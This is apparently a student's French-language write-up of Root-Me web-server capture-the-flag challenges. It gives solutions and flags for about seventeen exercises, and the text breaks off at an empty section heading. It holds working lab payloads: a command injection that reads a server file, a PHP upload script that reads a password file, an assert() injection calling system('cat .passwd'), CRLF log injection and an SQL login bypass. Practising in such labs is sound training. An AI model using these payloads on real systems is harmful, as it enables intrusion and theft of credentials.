# Challenge Web - Serveur

## 1. HTML

En observant le code HTML de la page, on retrouve le mot de passe commenté dans le body :

```html
<!--
Je crois que c'est vraiment trop simple là !
It's really too easy !
password : nZ^&@q5&sjJHev0
-->
```

Le mot de passe est donc **nZ^&@q5&sjJHev0**.

## 2. HTTP - Open Redirect

En regardant l'URL des liens de redirection, on observe qu'ils prennent en paramètre une URL `url` et un HASH `h`, semblablement du `MD5`.

```html
<a href="?url=https://facebook.com&amp;h=a023cfbf5f1c39bdf8407f28b60cd134">facebook</a>
```

On remarque ensuite que le hash passé est égal à l'url hashée. En réalisant une requête cURL en passant par une autre url, on arrive à se rediriger. Ainsi, en réalisant une requête cURL sans redirection avec le flag -L, on trouve le résultat suivant:

```shell
nicolas@DESKTOP-JOGTTVS:/mnt/c/Users/Nicolas Law Yim Wan/Projects/ETNA/ROOTME/root_me_svn$ curl 'http://challenge01.root-me.org/web-serveur/ch52/?url=https://www.google.com/&h=d75277cdffef995a46ae59bdaef1db86'
<!DOCTYPE html>
<html>
<head>
        <title>HTTP - Open redirect</title>
</head>


<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
        <p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5</p><script>document.location = 'https://www.google.com/';</script>
```

Le flag est donc **e6f8a530811d5a479812d7b82fc1a5c5**.

## 3. Injection de commande

Ici, on remarque rapidement que l'ouput du ping ressemble à la commande UNIX `ping` :

```shell
PING google.com (216.58.213.174) 56(84) bytes of data.
64 bytes from par21s04-in-f14.1e100.net (216.58.213.174): icmp_seq=1 ttl=57 time=1.08 ms
64 bytes from par21s04-in-f14.1e100.net (216.58.213.174): icmp_seq=2 ttl=57 time=1.08 ms
64 bytes from par21s04-in-f14.1e100.net (216.58.213.174): icmp_seq=3 ttl=57 time=1.03 ms

--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2006ms
rtt min/avg/max/mdev = 1.033/1.069/1.088/0.025 ms
```

Le script PHP appelle donc la fonction `exec` qui appelle une commande système. On passe donc une commande `tail` pour être appelée après le ping :

```
google.fr & tail -n 10 index.php
```

L'output nous renvoie donc le code du fichier `index.php` :

```shell
$flag = "S3rv1ceP1n9Sup3rS3cure";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?>
PING google.fr (172.217.19.227) 56(84) bytes of data. 64 bytes from par21s11-in-f3.1e100.net (172.217.19.227): icmp_seq=1 ttl=57 time=0.932 ms 64 bytes from par21s11-in-f3.1e100.net (172.217.19.227): icmp_seq=2 ttl=57 time=0.914 ms 64 bytes from par21s11-in-f3.1e100.net (172.217.19.227): icmp_seq=3 ttl=57 time=0.907 ms --- google.fr ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2002ms rtt min/avg/max/mdev = 0.907/0.917/0.932/0.036 ms
```

Le mot de passe est **S3rv1ceP1n9Sup3rS3cure**.

## 4. Mot de passe faible

On teste bêtement le combo `admin` - `admin`... et ça fonctionne.

Le flag est **admin**.

## 5. User-agent

On fait une requête cURL en passant le User-Agent admin comme indiqué en indice du défi :

```shell
nicolas@DESKTOP-JOGTTVS:/mnt/c/Users/Nicolas Law Yim Wan$ curl -A "admin" http://challenge01.root-me.org/web-serveur/ch2/
<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27</h3></body></html>
```

Le flag est **rr$Li9%L34qd1AAe27**.

## 6. Fichier de sauvegarde

Il existe différentes syntaxes de fichiers auto-générés, après avoir essayé différentes syntaxes telles que `#.index.php`, `_.index.php`, `~.index.php`, on récupére un fichier via la syntaxe `index.php~`
On retrouve donc le flag **OCCY9AcNm1tj**.

## 7. HTTP Directory Indexing

En regardant le code source de la page, on observe une ligne commentée :

```html
<!-- include("admin/pass.html") -->
```

On essaie d'y accéder mais c'est un piège ! On accède donc à la racine du dossier `/admin` où on voit un dossier `/backup`. On y trouve le fichier `admin.txt` avec le contenu suivant :

```
Password / Mot de passe : LINUX
```

Le flag est **LINUX**.

## 8. HTTP Headers

En accédant à la page du challenge, on observe le message suivant : `Content is not the only part of an HTTP response!`

On effectue une requête sur la page avec cURL et on obtient le résultat suivant :

```shell
nicolas@DESKTOP-JOGTTVS:/mnt/c/Users/Nicolas Law Yim Wan$ curl -v http://challenge01.root-me.org/web-serveur/ch5/
*   Trying 212.129.38.224...
* Connected to challenge01.root-me.org (212.129.38.224) port 80 (#0)
> GET /web-serveur/ch5/ HTTP/1.1
> Host: challenge01.root-me.org
> User-Agent: curl/7.47.0
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx
< Date: Thu, 19 Jul 2018 17:39:17 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Vary: Accept-Encoding
< Header-RootMe-Admin: none
<
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
</body>
</html>
* Connection #0 to host challenge01.root-me.org left intact
```

On remarque que le header `Header-RootMe-Admin` est passé à `none`. En effectuant la même requête avec le header passé à `true`, on obtient le flag:

```shell
nicolas@DESKTOP-JOGTTVS:/mnt/c/Users/Nicolas Law Yim Wan$ curl --header "Header-RootMe-Admin: true" http://challenge01.root-me.org/web-serveur/ch5/
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful</p></body>
</html>
```

Le flag est **HeadersMayBeUseful**.

## 9. HTTP Verb Tampering

En se connectant sur la page, on nous demande un login et mot de passe. En effectuant une requête avec un Verb Tampering `UNLOCK` (`curl --request UNLOCK http://challenge01.root-me.org/web-serveur/ch8/`), on arrive à bypasser l'authentification :

```shell
nicolas@DESKTOP-JOGTTVS:/mnt/c/Users/Nicolas Law Yim Wan$ curl --request UNLOCK http://challenge01.root-me.org/web-serveur/ch8/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html><head>
</head>

<h1>Mot de passe / password : a23e$dme96d3saez$$prap</h1>
</body></html>
```

Le flag est donc **a23e$dme96d3saez$$prap**.

## 10. Install files

En regardant le code de la page, on observe en commenté que le site utilise PHPBB :

```html
<!--  /web-serveur/ch6/phpbb -->
```

En accédant à son dossier d'installation `/phpbb/install/`, on trouve le fichier `install.php` qui contient le flag **karambar**.

```
Bravo, vous venez de decouvrir une des nombreuses failles de phpBB.

Cette faille est en fait un oubli du Webmaster qui aurait du enlever
ces dossiers. Ils contiennent les pages d'installations du forum phpbb.
Ce genre de chose n'existe plus car les développeurs mettent en place des
systèmes de vérification pour faciliter la tâche aux plus têtes en l'air
Ce qu'il faut comprendre par contre c'est qu'on découvre souvent beaucoup de choses
en trifouillant des URL...
Grâce à elles, vous pouvez remettre à zéro le forum, et changer tous les passwords
administrateur, étant donné que vous reinitialisez le forum.
Vous avez donc ensuite un contrôle total du forum !!

Le mot de passe pour valider est : karambar

Bon courage !
```

## 11. Redirection invalide



## 12. CRLF

En se renseignant à propos de l'injection CRLF, on découvre que les caractères `%0d%0a` permettent de passer des données supplémentaires dans une requête.
On passe donc le message "admin authenticated." suivi du flag CRLF ainsi que du mot guest pour faire croire au fichier de log qu'on s'est connecté et le flag attentu s'affiche :

```
URL utilisée : http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0d%0aguest
```

Le flag est donc  **rFSP&G0p&5uAg1%**.

## 13. File upload - double extensions

Comme le titre du défi l'indiquait, nous avons utilisé un fichier avec une double extension pour exécuter du code PHP.
Nous avons donc créé un fichier `img.php.jpeg`, puisque seules les extensions GIF, PNG et JPEG étaient acceptées, et nous avons mis en corps du fichier le code suivant permettant de lire le contenu du fichier `.passwd` et de l'afficher :
```php
<?php
$file = file_get_contents('../../../.passwd');
var_dump($file);
?>
```
Une fois le fichier uploadé, on y accède via l'URL indiquée et celui nous retourne le mot de passe :
```
string(26) "Gg9LRz-hWSxqqUKd77-_q-6G8 "
```
## 15. HTTP Cookies

On renseigne dans un premier temps son adresse mail dans le formulaire puis on essaie d'accéder à la liste des mails sauvegardés. Un message d'erreur s'affiche alors en nous indiquant que nous ne sommes pas admin: `You need to be admin `

En observant les cookies, on voit un nouveau cookie avec la valeur `visiteur`. En passant cette valeur à `admin`, on peut accède au flag **ml-SYMPA**.

## 16. Directory traversal

En cliquant sur les liens du menu, on observe le paramètre GET `galerie` qui prend différentes valeurs selon le menu cliqué. En passant un paramètre vide, on observe une nouvelle catégorie : `86hwnX2r`

En accédant à la catégorie `86hwnX2r` via l'URL `http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r`, on trouve un fichier `password` contenant le flag **kcb$!Bx@v4Gs9Ez**.

## 17.	PHP Assert() 

En visitant le site du challenge, on observe que le fichier PHP prend un paramètre GET `?page=flag` pour réaliser la navgitation. En se renseignant sur les attaques `LFI` / `Local File Inclusion`, on voit qu'on peut réécrire le code executé. En utilisant l'URL suivante : `http://challenge01.root-me.org/web-serveur/ch47/?page=', '0') === false and system("cat .passwd") and strpos('` et en concaténant des commandes entre les assertions, on parvient à obtenir le flag ***x4Ss3rT1nglSn0ts4f3A7A1Lx**.

```html
The flag is / Le flag est : x4Ss3rT1nglSn0ts4f3A7A1Lx Remember to sanitize all user input! / Pensez à valider toutes les entrées utilisateurs ! Don't use assert! / N'utilisez pas assert ! 'includes/', '0') === false and system("cat .passwd") and strpos('.php'File does not exist
```

 ## 18. SQL Injection 

On peut réaliser une injection SQL en bypassant le mot de passe grâce à la commande `--` qui termine la commande SQL.

Ainsi, en passant dans le formulaire en les datas `admin' --` et n'importe quoi dans le mot de passe, on obtient le flag **t0_W34k!$** dans le code HTML :

```html
<h2>Welcome back admin !</h2><h3>Your informations :</h3><p>- username : <input type="text" value="admin" disabled /><br/>- password : <input type="password" value="t0_W34k!$" disabled /></p><br />Hi master ! <b>To validate the challenge use this password</b>
```

En effet, les caractères `--` annulent la suite de la requête donc la requête selectionne uniquement le user admin sans utiliser le mot de passe.

## 19. 